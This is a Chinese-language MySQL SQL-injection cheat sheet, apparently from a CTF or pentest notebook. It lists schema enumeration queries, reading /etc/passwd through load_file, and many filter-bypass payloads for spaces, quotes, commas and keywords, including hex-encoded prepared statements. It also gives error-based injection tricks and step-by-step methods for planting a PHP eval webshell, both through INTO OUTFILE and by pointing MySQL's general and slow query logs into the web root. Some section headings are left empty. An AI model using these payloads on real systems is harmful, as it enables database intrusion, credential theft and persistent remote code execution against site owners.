# mysql数据库结构

**information_schema**MySQL系统数据库

- tables（所有库中的表）
  - table_schema（数据库名）
  - table_name（表名）
- columns（所有表中的字段）
  - table_schema（数据库名）
  - table_name
  - column_name
- schemata（所有数据库）
  - schema_name

**mysql**

- user（所有用户信息）
  - authentication_string（用户密码的hash）

# SQL

```mysql
当前用户：select user()
数据库版本：select version() , select @@version
数据库名：select database()
操作系统：select @@version_compile_os
所有变量：show variables
单个变量：select @@secure_file_priv , show variables like 'secure_file_%'
爆字段数：order by 1... ，group by 1...
查库名：select group_concat(schema_name) from information_schema.schemata
查表名：select group_concat(table_name) from information_schema.tables where table_schema='库名'
查字段：select group_concat(column_name) from information_schema.columns where table_name='表名'
读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）
读文件：select load_file('/etc/passwd')
写文件：select '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/a.php'  //该处文件名无法使用16进制绕过
```

## 常用函数

```mysql
截取字符串：substr('abc',1,1)、substring('abc',1,1)、left('abc',1)、right('abc',1)，mid('abc',1,1)
字符串拼接：concat('a','b','c')，concat_ws(' ','a','b','c'), select 'a' 'b'
多行拼接：group_concat //eg: select group_concat(user) from mysql.user
时延函数：sleep(5)、benchmark(10000000,md5('123456')) //其他方法get_lock()，笛卡尔，rlike等
编码函数: hex、ord、ascii、char、conv(255,10,16)=FF（2-36进制转换）
布尔条件：if(1,1,0)、position('a' in 'abc')、elt(1,'a','b')=a&&elt(2,'a','b')=b、(case when (bool) then 1 else 0 end)、field('a',3,2,'a')=3、nullif('a','b')=1&&nullif('a','a')=null、strcmp、regexp、rlike、regexp_like('1','1')...
```

https://dev.mysql.com/doc/refman/8.0/en/func-op-summary-ref.html

## 绕过方法

#### 绕空格

```
%20、%09、%0a、%0b、%0c、%0d、%a0、%00、/**/、 /*!select*/ 、()、--%0a（可以1-256都跑一遍）
```

其中%09需要php环境，%0a为\n  `/*!select*/`为mysql独有。常见用法为`/*!50727select 1*/`，即当版本号小于等于50727时，执行select 1

### 绕过单引号

`\转义、宽字节%df%27，%bf%27、十六进制绕过`

#### 注释方法

`/**/、--+、#、;%00 `

`union /*!select*/（mysql独有）`

### select from union select绕过

```mysql
select-1,user from mysql.user
select@1,user from mysql.user
select~1,user from mysql.user
select`user`,user from mysql.user
select(1),user from mysql.user
select'1',user from mysql.user
select+1,user from mysql.user

select 1,1e2from mysql.user
select 1,.9from mysql.user
select 1``from mysql.user
select 1''from mysql.user
select 1'123'from mysql.user
select '1'''from mysql.user
select 1""from mysql.user
select "1"""from mysql.user

select 1 from mysql.user where user=.1union select 1
select 1 from mysql.user where user=1e1union select 1
select 1 union--%0aselect 2
select 1 union--%0e%0aselect 2
select 1 union all select 2
```

### set绕过

```mysql
select '123' into @a
select @a:='123'
select 1 from mysql.user where @a:='123'
do @a:='123'
```

### 绕过(点绕过)//select,from等关键字绕过都可以使用

```mysql
select 0x73656c65637420757365722066726f6d206d7973716c2e75736572 into @s;prepare a from @s;EXECUTE a; //0x736... =>'select user from mysql.user'
set @a concat('select user from mysql',char(46),'user');prepare a from @s;EXECUTE a;
```

### information_schema绕过

```mysql
select table_name from mysql.innodb_index_stats 表名
select database_name from mysql.innodb_index_stats 库名
select table_name from mysql.innodb_table_stats 表名
select database_name from mysql.innodb_table_stats 库名
```

### 逗号绕过

```mysql
select * from ((select 1)A join (select 2)B join (select 3)C) union (select * from ctf)
select x.1 from (select * from ((select 1)A join (select 2)B join (select 3)C) union (select * from ctf)x)
```

------

### order by注入



### desc,asc注入

---------

### floor报错注入

### xpath报错注入

### name_const列名重复报错

`select * from (select name_const(version(),1),name_const(version(),1))x //只能使用常量和普通字符串`

### join列名重复报错

`select * from(select a.1 from mysql.user a join mysql.user b)c`

----

## webshell写入

1. 直接写

查看可写目录范围，默认为空即不可写不可读

```mysql
select @@secure_file_priv
```

写入

```javascript
select '<?php @eval($_POST[shell]); ?>' into outfile '/etc/www/html/shell.php'
```

2. 日志写webshell

```text
MySQL日志文件系统的组成:
错误日志log_error：记录启动、运行或停止mysqld时出现的问题。
通用日志general_log：记录建立的客户端连接和执行的语句。
更新日志：记录更改数据的语句。该日志在MySQL 5.1中已不再使用。
二进制日志：记录所有更改数据的语句。还用于复制。
慢查询日志slow_query_log：记录所有执行时间超过long_query_time秒(默认10秒)的所有查询或不使用索引的查询。
Innodb日志：innodb redolog
```

以下举例两种

```mysql
show global variables like "%general%";                 #查看general文件配置情况
set global general_log='on';                            #开启日志记录
set global general_log_file='C:/phpstudy/WWW/shell.php';
select '<?php @eval($_POST[shell]); ?>';                #日志文件导出指定目录
set global general_log=off;                             #关闭记录
show variables like '%slow%';                           #慢查询日志
set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
set GLOBAL slow_query_log=on;
/*set GLOBAL log_queries_not_using_indexes=on;
show variables like '%log%';*/
select '<?php phpinfo();?>' from mysql.user where sleep(10);
```

